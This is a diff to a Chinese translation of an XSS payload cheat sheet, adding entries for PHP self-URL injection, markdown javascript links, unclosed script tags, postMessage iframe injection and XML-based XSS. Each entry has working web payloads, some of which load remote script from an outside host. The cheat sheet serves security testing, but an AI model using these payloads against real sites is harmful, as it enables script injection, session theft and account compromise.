@@ -126,7 +126,32 @@ data:text/html,<img src=1 onerror=alert(1)>
 data:text/html,<iframe src=javascript:alert(1)>
 ```
 **19.PHP Self URL Injection (PHP self URL注入)** <br>
-
+当网站服务器端PHP代码，将当前URL当作HTML表单属性值进行获取。payload在斜杠（/）在php扩展名和查询部分的开始（？）之间插入。<br>
+```
+https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
+```
+**20.Markdown Vector (Markdown 组件测试)**  <br>
+在网站允许某些markdown标记，比如：输入的文本框，注释部分等中使用payload。点击触发。<br>
+```
+[clickme](javascript:alert`1`)
+```
+**21.Script Injection - No Closing Tag (脚本注入-没有结束标记)** <br>
+payload在反射后的javascript代码中有结束脚本标签（</script>）时使用。 <br>
+```
+<script src=data:,alert(1)>
+<script src=//brutelogic.com.br/1.js>
+```
+**22.Javascript postMessage() DOM Injection (with Iframe) (Javascript postMessage() DOM注入（带有Iframe）)**
+在JavaScript代码中有"message"事件监听器(如"window.addEventListener('message',...)")时使用该payload，并且服务器端没有检查来源。 如果能够对目标进行请求伪造（根据http请求 X-Frame Options标头）。 则另存一个HTML文件（或者使用data:text/html，以提供TARGET_URL和INJECTION（xss payload）进行测试。<br>
+```
+<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
+```
+**23.XML-Based XSS (基于XML的XSS)**
+该payload用于在XML页面(内容类型为text/xml或application/xml）中进行测试。如果输入点位于注释部分，则在payload前添加"->"；如果输入位于CDATA部分，则将"->"添加payload。<br>
+```
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
+```
 
 ## 致谢
 **英文议题作者：** <br>
